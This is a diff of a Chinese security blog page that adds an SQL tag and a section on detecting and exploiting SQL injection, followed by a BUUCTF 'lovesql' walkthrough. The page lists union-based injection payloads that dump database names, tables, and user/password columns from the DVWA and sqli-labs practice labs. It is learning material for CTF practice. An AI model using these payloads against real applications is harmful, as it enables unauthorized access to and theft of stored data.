@@ -353,9 +353,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/SQL/">
+                                <span class="chip bg-color">SQL</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -374,14 +378,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-03-25
+                    2025-03-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    473
+                    746
                 </div>
                 
 
@@ -415,7 +419,29 @@
 <li><code>参数内容会被带入到数据库查询</code></li>
 <li>变量未存在过滤或者过滤不严谨</li>
 </ul>
-<h1 id="三、测试"><a href="#三、测试" class="headerlink" title="三、测试"></a>三、测试</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>1’ and ‘1’&#x3D;’1<br>1’ or sleep(5)#<br>联合注入<br>1’ order by 5 #<br>1’ union select 1,2 #<br>1’ union select 1,database() #<br>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’dvwa’#<br>1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ #<br>1’ union select user,password from users #</p>
+<h1 id="三、SQL探测"><a href="#三、SQL探测" class="headerlink" title="三、SQL探测"></a>三、SQL探测</h1><h2 id="一．探测sql注入的存在"><a href="#一．探测sql注入的存在" class="headerlink" title="一．探测sql注入的存在"></a>一．探测sql注入的存在</h2><p>sql注入第一个前置条件</p>
+<ol>
+<li>用户输入的参数是可以控制的 id</li>
+<li>用户的输入id 用单引号进行包裹的 sql语句我们是可以操控–&gt; 这个功能点存在sql注入漏洞</li>
+</ol>
+<p>单双引号去判断 sql注入payload 二开burp的插件</p>
+<p>xiazhu 查看去自动化实现sql注入的探测</p>
+<p>证明sql语句能够成立 and or</p>
+<p>sql注入漏洞利用 -&gt; 能注入出数据</p>
+<p>select  union 联合查询</p>
+<p>页面有sql报错 并且页面有回显</p>
+<p>web漏洞 -&gt; sql注入 -&gt; 联合注入&#x2F;报错注入&#x2F;盲注&#x2F;二次注入&#x2F;堆叠注入&#x2F;宽字节注入…</p>
+<h2 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h2><p>第一步 爆回显位</p>
+<p>-1’ union select 1,2,3–+</p>
+<p>第二步 爆当前的库名</p>
+<p>-1’ union select 1,2,database()–+</p>
+<p>第三步 爆表名</p>
+<p>-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+</p>
+<p>第四步 爆列名</p>
+<p>第五步 爆数据</p>
+<p>sql注入利用完成 -&gt; 完整的利用链</p>
+<p>爆出users表下的所有数据</p>
+<h1 id="四、测试"><a href="#四、测试" class="headerlink" title="四、测试"></a>四、测试</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>1’ and ‘1’&#x3D;’1<br>1’ or sleep(5)#<br>联合注入<br>1’ order by 5 #<br>1’ union select 1,2 #<br>1’ union select 1,database() #<br>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’dvwa’#<br>1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ #<br>1’ union select user,password from users #</p>
 <h2 id="BUUCTF的lovesql题目"><a href="#BUUCTF的lovesql题目" class="headerlink" title="BUUCTF的lovesql题目"></a>BUUCTF的lovesql题目</h2><p>1.登录测试sql语句</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325134343318.png" alt="image-20250325134336217"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325134354153.png" alt="image-20250325134354097"></p>
@@ -483,7 +509,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/SQL/">
+                                    <span class="chip bg-color">SQL</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -637,6 +667,14 @@
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/SQL/">
+                        <span class="chip bg-color">SQL</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
